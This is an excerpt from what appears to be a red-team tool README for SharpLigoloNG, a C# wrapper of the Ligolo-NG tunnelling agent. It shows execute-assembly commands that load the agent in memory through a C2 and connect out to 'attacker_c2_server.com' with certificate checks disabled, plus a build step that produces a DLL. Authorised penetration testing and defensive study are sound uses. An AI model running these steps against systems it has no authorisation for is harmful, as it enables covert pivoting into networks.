...
A C# wrapper for the [Ligolo-NG](https://github.com/nicocha30/ligolo-ng) **agent** version **0.7.5**

Once built can be executed via `execute-assembly` on your C2, or any method to run C# in memory

```shell
execute-assembly /tmp/SharpLigoloNG.exe -connect attacker_c2_server.com:11601 -ignore-cert

# To enable websocket mode - run with prefix https:// the agent & proxy(server)
execute-assembly /tmp/SharpLigoloNG.exe -connect https://attacker_c2_server.com:11601 -ignore-cert
```
---
...
//export mainwrapper
func mainwrapper(charargs *C.char) {
...
## 🧰 Compiling into `.dll`
```shell
C:\Tools\ligolo-ng\cmd\agent> go build --buildmode=c-shared -ldflags="-s -w"  -o main.dll main.go
```
...
* [fckoo](https://github.com/fckoo) - https://github.com/fckoo/SharpLigolo-NG
